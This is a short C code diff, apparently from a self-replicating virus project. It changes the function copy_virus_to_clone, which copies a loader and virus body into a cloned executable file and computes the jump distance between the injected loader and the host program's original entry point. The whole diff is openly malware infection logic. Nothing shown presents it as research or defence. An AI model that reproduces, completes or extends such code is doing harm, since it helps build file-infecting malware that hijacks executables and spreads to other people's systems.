@@ -10,7 +10,7 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 			const struct virus_header *vhdr)
 {
 	// copy loader and virus
-	void	*loader_location = safe(clone_ref, file_entry->end_of_last_section, vhdr->full_virus_size);
+	void	*loader_location = safe(clone_ref, file_entry->payload_offset, vhdr->full_virus_size);
 
 	if (loader_location == NULL)
 		return errors(ERR_VIRUS, _ERR_V_CANT_READ_FULL_VIRUS);
@@ -18,9 +18,8 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 	memcpy(loader_location, vhdr->loader_entry, vhdr->full_virus_size);
 
 	// gather offsets
-	const size_t	shoff            = file_entry->safe_shdr->sh_offset;
-	const size_t	loader_entry_off = file_entry->end_of_last_section;
-	const size_t	client_entry_off = shoff + file_entry->offset_in_section;
+	const size_t	loader_entry_off = file_entry->payload_offset;
+	const size_t	client_entry_off = file_entry->entry_offset;
 
 	// compute distances
 	const size_t	dist_jmpclient_loader_entry = loader_entry_off - client_entry_off;
